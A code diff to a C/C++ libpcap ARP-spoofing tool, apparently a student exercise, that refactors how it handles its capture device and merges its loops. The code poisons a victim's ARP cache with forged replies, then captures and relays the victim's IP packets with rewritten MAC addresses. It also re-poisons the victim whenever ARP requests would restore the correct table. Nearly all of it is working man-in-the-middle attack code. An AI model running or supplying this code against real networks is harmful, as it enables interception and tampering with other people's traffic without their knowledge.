@@ -70,13 +70,9 @@ void usage() {
 }
 
 int sendArpPacket(char* dev, char* eth_dmac, char* eth_smac, uint16_t my_arp_op,
-                  char* arp_smac, char* arp_sip, char* arp_tmac, char* arp_tip){
-    char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 500, errbuf);
-        if (handle == nullptr) {
-        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
-        return -1;
-    }
+                  char* arp_smac, char* arp_sip, char* arp_tmac, char* arp_tip,
+                  pcap_t* handle){
+
 
     EthArpPacket packet;
 
@@ -105,7 +101,7 @@ int sendArpPacket(char* dev, char* eth_dmac, char* eth_smac, uint16_t my_arp_op,
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
     }
 
-    pcap_close(handle);
+
     printf("1\n");
     return 1;
 }
@@ -116,7 +112,7 @@ int getSomeoneMacAddr(char* dev, char* eth_dmac, char* eth_smac, uint16_t my_arp
     while (true) {
         // stage 1 ----------------------------------------------------
         sendArpPacket(dev, eth_dmac, eth_smac, my_arp_op,
-                      arp_smac, arp_sip, arp_tmac, arp_tip);
+                      arp_smac, arp_sip, arp_tmac, arp_tip, handle1);
         // endof stage 1 ----------------------------------------------
 
         // stage 2 ------------------------------------------------
@@ -226,42 +222,31 @@ int main(int argc, char* argv[]) {
                       victimMacAddr, handle1);
     printf("victimMacAddr : %s\n", victimMacAddr);
 
-    pcap_close(handle1);
-
-
-  while(true){
 
     // stage 3 ------------------------------------------------
     sendArpPacket(dev, victimMacAddr, myMacAddr, ArpHdr::Reply,
-                  myMacAddr, TARGET_IP, victimMacAddr, SENDER_IP);
+                  myMacAddr, TARGET_IP, victimMacAddr, SENDER_IP, handle1);
     // endof stage 3 ------------------------------------------
 
+    while(true){
 
-    // stage 4 ------------------------------------------------
-    char errbuf4[PCAP_ERRBUF_SIZE];
-    pcap_t* handle4 = pcap_open_live(dev, BUFSIZ, 1, 500, errbuf4);
-    if (handle4 == nullptr) {
-        fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf4);
-        return -1;
-    }
+        // stage 4 ------------------------------------------------
 
-    int whileCnt = 0;
-    while (true) {
         struct pcap_pkthdr* header;
         struct eth_hdr* ehdr;
         struct ip_hdr* ihdr;
 
         char* ehdr_dmac_4;
         char ehdr_smac_4[40] = {0, }; // plz check again
-        short ehdr_proto_4; //
+        short ehdr_proto_4;
         char ihdr_sip_4[40];
         char ihdr_dip_4[40];
         const u_char* packet4;
 
-        int res = pcap_next_ex(handle4, &header, &packet4);
+        int res = pcap_next_ex(handle1, &header, &packet4);
         if (res == 0) continue;
         if (res == -1 || res == -2) {
-            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle4));
+            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle1));
             break;
         }
         ehdr = (struct eth_hdr *)packet4;
@@ -274,139 +259,125 @@ int main(int argc, char* argv[]) {
         strncpy(ehdr_dmac_4, ether_ntoa((struct ether_addr *)ehdr->h_dest), ehdr_dmac_4_size);
 
         ehdr_proto_4 = htons(ehdr->h_proto);
-        //packet4 += 14;
-        ihdr = (struct ip_hdr *)(packet4+14);
-        int packet_len = ntohs(ihdr->ip_total_length) + sizeof(struct eth_hdr);
+
+        if(ehdr_proto_4 == 2048){
+            //packet4 += 14;
+            ihdr = (struct ip_hdr *)(packet4+14);
+            int packet_len = ntohs(ihdr->ip_total_length) + sizeof(struct eth_hdr);
 
 
-        strcpy(ihdr_sip_4, inet_ntoa((ihdr->ip_srcaddr)));
-        strcpy(ihdr_dip_4, inet_ntoa((ihdr->ip_destaddr)));
+            strcpy(ihdr_sip_4, inet_ntoa((ihdr->ip_srcaddr)));
+            strcpy(ihdr_dip_4, inet_ntoa((ihdr->ip_destaddr)));
 
-        printf("stage 4 =====================================%d\n", whileCnt++);
-        printf("ehdr_smac_4 : %s\n", ehdr_smac_4); // desired value : 00:07:89:63:05:5d
-        printf("ehdr_dmac_4 : %s\n", ehdr_dmac_4);
-        printf("ehdr_proto_4 : %u\n", ehdr_proto_4);
-        printf("idhr_sip_4 : %s\n", ihdr_sip_4); // desired value : 172.30.1.40
+            printf("stage 4 =====================================\n");
+            printf("ehdr_smac_4 : %s\n", ehdr_smac_4); // desired value : 00:07:89:63:05:5d
+            printf("ehdr_dmac_4 : %s\n", ehdr_dmac_4);
+            printf("ehdr_proto_4 : %u\n", ehdr_proto_4);
+            printf("idhr_sip_4 : %s\n", ihdr_sip_4); // desired value : 172.30.1.40
 
-        int cmp = strcmp(ehdr_smac_4, victimMacAddr);
-        bool flag1 = cmp ? 0 : 1; // ehdr_smac
-        bool flag2 = strcmp(ehdr_dmac_4, myMacAddr) == 0 ? 1 : 0; // ihdr_sip
-        bool flag3 = ehdr_proto_4 == 2048; // ehdr_protocol
-        bool flag4 = strcmp(ihdr_sip_4, SENDER_IP) == 0 ? 1 : 0; // ihdr_sip
-        printf("spoofed packet flag : %d %d %d %d\n", flag1, flag2, flag3, flag4);
+            int cmp = strcmp(ehdr_smac_4, victimMacAddr);
+            bool flag1 = cmp ? 0 : 1; // ehdr_smac
+            bool flag2 = strcmp(ehdr_dmac_4, myMacAddr) == 0 ? 1 : 0; // ihdr_sip
+            bool flag3 = ehdr_proto_4 == 2048; // ehdr_protocol
+            bool flag4 = strcmp(ihdr_sip_4, SENDER_IP) == 0 ? 1 : 0; // ihdr_sip
+            printf("spoofed packet flag : %d %d %d %d\n", flag1, flag2, flag3, flag4);
 
-        if(flag1 && flag2 && flag3 && flag4){
-            // stage 5------------------------------------
-            Mac *dMac = new Mac(targetMacAddr);
-            Mac *sMac = new Mac(myMacAddr);
-            memcpy((u_char*)packet4, dMac, 6);
-            memcpy((u_char*)packet4+6, sMac, 6);
+            if(flag1 && flag2 && flag3 && flag4){ // spoofed -> then relay
+                // stage 5------------------------------------
+                Mac *dMac = new Mac(targetMacAddr);
+                Mac *sMac = new Mac(myMacAddr);
+                memcpy((u_char*)packet4, dMac, 6);
+                memcpy((u_char*)packet4+6, sMac, 6);
 
-            int i;
-            printf("packet_len : %u\n", packet_len);
-            for(i=0;i<packet_len / 2;i++){
-                printf("%02x ", reinterpret_cast<const u_char*>(packet4)[i]);
+                int i;
+                printf("packet_len : %u\n", packet_len);
+                for(i=0;i<packet_len / 2;i++){
+                    printf("%02x ", reinterpret_cast<const u_char*>(packet4)[i]);
+                }
+                printf("i : %d\n", i);
+                printf("addr of packet4 : %p\n", &packet4);
+
+                int res = pcap_sendpacket(handle1, reinterpret_cast<const u_char*>(packet4), packet_len);
+                if (res != 0) {
+                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle1));
+                }
+                printf("*******relay complete !!*******\n");
+                // endof stage 5 -----------------------------
+                //break;
             }
-            printf("i : %d\n", i);
-            printf("addr of packet4 : %p\n", &packet4);
-
-            int res = pcap_sendpacket(handle4, reinterpret_cast<const u_char*>(packet4), packet_len);
-            if (res != 0) {
-                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle4));
-            }
-            // endof stage 5 -----------------------------
-            break;
         }
-    }
-    pcap_close(handle4);
     // endof stage 4 ------------------------------------------
 
     // stage 6 ------------------------------------------------
-    char errbuf6[PCAP_ERRBUF_SIZE];
-    pcap_t* handle6 = pcap_open_live(dev, BUFSIZ, 1, 500, errbuf6);
-    if (handle6 == nullptr) {
-        fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf6);
-        return -1;
+        if(ehdr_proto_4 == 2054){
+
+            struct arp_hdr* ahdr;
+            char ahdr_sip_6[40];
+            char ahdr_tip_6[40];
+
+            ahdr = (struct arp_hdr *)(packet4 + 14);
+            strcpy(ahdr_sip_6, inet_ntoa((ahdr->ar_sip)));
+            strcpy(ahdr_tip_6, inet_ntoa((ahdr->ar_tip)));
+            unsigned short ahdr_op = htons(ahdr->ar_op);
+
+            printf("stage 6 -------------------------------------\n");
+            printf("ehdr_dmac_4 : %s\n", ehdr_dmac_4); // desired value : 00:07:89:63:05:5d
+            printf("ehdr_proto_4 : %u\n", ehdr_proto_4);
+            printf("ar_op : %u\n", ahdr_op);
+            printf("adhr_sip_6 : %s\n", ahdr_sip_6); // desired value : 172.30.1.40
+            printf("adhr_dip_6 : %s\n", ahdr_tip_6); // desired value : 172.30.1.254
+
+            bool flag1 = strcmp(ehdr_dmac_4, myMacAddr) == 0 ? 1 : 0; // ehdr_dmac
+            bool flag1_ver2 = strcmp(ehdr_dmac_4, BROAD_ETH_DMAC) == 0 ? 1 : 0;
+
+            bool flag3 = ahdr_op == 1 ? 1 : 0; // ahdr_op
+            bool flag4 = strcmp(ahdr_sip_6, SENDER_IP) == 0 ? 1 : 0; // ahdr_sip
+            bool flag5 = strcmp(ahdr_tip_6, TARGET_IP) == 0 ? 1 : 0; // ahdr_tip
+
+            bool flag5_ver8 = strcmp(ahdr_tip_6, SENDER_IP) == 0 ? 1 : 0; // ahdr_tip
+            //bool flag6 = strcmp(ahdr_tip_6, BROAD_ARP_TMAC) == 0 ? 1 : 0;
+            printf("flag : %d %d(ver2) %d %d %d %d\n", flag1, flag1_ver2, flag3, flag4, flag5, flag5_ver8);
+
+
+
+
+            if(flag1 && flag3 && flag4 && flag5){
+                //printf("unicast arp-table recovering trial\n");
+                // stage 7------------------------------------
+                sendArpPacket(dev, victimMacAddr, myMacAddr, ArpHdr::Reply,
+                              myMacAddr, TARGET_IP, victimMacAddr, SENDER_IP, handle1);
+                // endof stage 7 -----------------------------
+                printf("*******reinfest complete (unicast) !!*******\n");
+                //break;
+            }
+
+            if(flag1_ver2 && flag3 && flag5_ver8){
+                //printf("broadcast arp-table recovering trial\n");
+                // stage 8------------------------------------
+                sendArpPacket(dev, victimMacAddr, myMacAddr, ArpHdr::Reply,
+                              myMacAddr, TARGET_IP, victimMacAddr, SENDER_IP, handle1);
+                printf("*******reinfest complete (broadcast) !!*******\n");
+                // endof stage 8 -----------------------------
+
+                //break;
+            }
+
+            if(flag1_ver2 && flag3 && flag4 && flag5){
+
+                // stage 8------------------------------------
+                sendArpPacket(dev, victimMacAddr, myMacAddr, ArpHdr::Reply,
+                              myMacAddr, TARGET_IP, victimMacAddr, SENDER_IP, handle1);
+                //printf("*******reinfest complete (sender's broadcast) !!*******\n");
+                // endof stage 8 -----------------------------
+
+                //break;
+            }
+            //unicast   - ether_dmac, ether_protocol, arp_op, arp_sip, arp_tip
+            //broadcast - ether_dmac_ver2, ether_protocol, arp_op, arp_sip, arp_tip, arp_dmac
+
+
+        // endof stage 6 ------------------------------------------
+      }
     }
-    int whileCount = 0;
-    while (true) {
-        struct pcap_pkthdr* header;
-        struct eth_hdr* ehdr;
-        struct arp_hdr* ahdr;
-
-        char* ehdr_dmac_6;
-        char ehdr_smac_6[40] = {0, }; // plz check again
-        short ehdr_proto_6; //
-        char ahdr_sip_6[40];
-        char ahdr_tip_6[40];
-        const u_char* packet6;
-
-        int res = pcap_next_ex(handle6, &header, &packet6);
-        if (res == 0) continue;
-        if (res == -1 || res == -2) {
-            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle6));
-            break;
-        }
-        ehdr = (struct eth_hdr *)packet6;
-
-        strcpy(ehdr_smac_6, ether_ntoa((struct ether_addr *)ehdr->h_dest));
-
-        size_t ehdr_dmac_6_size = strlen(ether_ntoa((struct ether_addr *)ehdr->h_dest))+1;
-        ehdr_dmac_6 = (char*)malloc(ehdr_dmac_6_size);
-        strncpy(ehdr_dmac_6, ether_ntoa((struct ether_addr *)ehdr->h_dest), ehdr_dmac_6_size);
-
-        ehdr_proto_6 = htons(ehdr->h_proto);
-        packet6 += 14;
-        ahdr = (struct arp_hdr *)packet6;
-
-        //unsigned char  ar_sha[6];       //sender mac
-        //struct in_addr ar_sip;
-        //unsigned char  ar_tha[6];       //Target mac (my)
-        //struct in_addr ar_tip;       //Target IP  (my)
-
-        strcpy(ahdr_sip_6, inet_ntoa((ahdr->ar_sip)));
-        strcpy(ahdr_tip_6, inet_ntoa((ahdr->ar_tip)));
-
-        printf("stage 6 -------------------------------------%d\n", whileCount++);
-        printf("ehdr_dmac_6 : %s\n", ehdr_dmac_6); // desired value : 00:07:89:63:05:5d
-        printf("ehdr_proto_6 : %u\n", ehdr_proto_6);
-        printf("adhr_sip_6 : %s\n", ahdr_sip_6); // desired value : 172.30.1.40
-        printf("adhr_dip_6 : %s\n", ahdr_tip_6); // desired value : 172.30.1.254
-
-        bool flag1 = strcmp(ehdr_dmac_6, myMacAddr) == 0 ? 1 : 0; // ehdr_dmac
-        bool flag2 = ehdr_proto_6 == 2054; // ehdr_prototype
-        bool flag3 = ahdr->ar_op == 1; // ahdr_op
-        bool flag4 = strcmp(ahdr_sip_6, SENDER_IP) == 0 ? 1 : 0; // ahdr_sip
-        bool flag5 = strcmp(ahdr_tip_6, TARGET_IP) == 0 ? 1 : 0; // ahdr_tip
-        printf("flag : %d %d %d %d %d\n", flag1, flag2, flag3, flag4, flag5);
-
-        bool flag1_ver2 = strcmp(ehdr_dmac_6, BROAD_ETH_DMAC) == 0 ? 1 : 0;
-        bool flag6 = strcmp(ahdr_tip_6, BROAD_ARP_TMAC) == 0 ? 1 : 0;
-
-        if(flag1 && flag2 && flag3 && flag4 && flag5){
-            printf("unicast arp-table recovering trial\n");
-            // stage 7------------------------------------
-            sendArpPacket(dev, victimMacAddr, myMacAddr, ArpHdr::Reply,
-                          myMacAddr, TARGET_IP, victimMacAddr, SENDER_IP);
-            // endof stage 7 -----------------------------
-
-            //break;
-        }
-
-        if(flag1_ver2 && flag2 && flag3 && flag4 && flag5 && flag6){
-            printf("broadcast arp-table recovering trial\n");
-            // stage 8------------------------------------
-            sendArpPacket(dev, victimMacAddr, myMacAddr, ArpHdr::Reply,
-                          myMacAddr, TARGET_IP, victimMacAddr, SENDER_IP);
-            // endof stage 8 -----------------------------
-
-            break;
-        }
-        //unicast   - ether_dmac, ether_protocol, arp_op, arp_sip, arp_tip
-        //broadcast - ether_dmac_ver2, ether_protocol, arp_op, arp_sip, arp_tip, arp_dmac
-    }
-
-    pcap_close(handle6);
-    // endof stage 6 ------------------------------------------
-  }
+    pcap_close(handle1);
 }
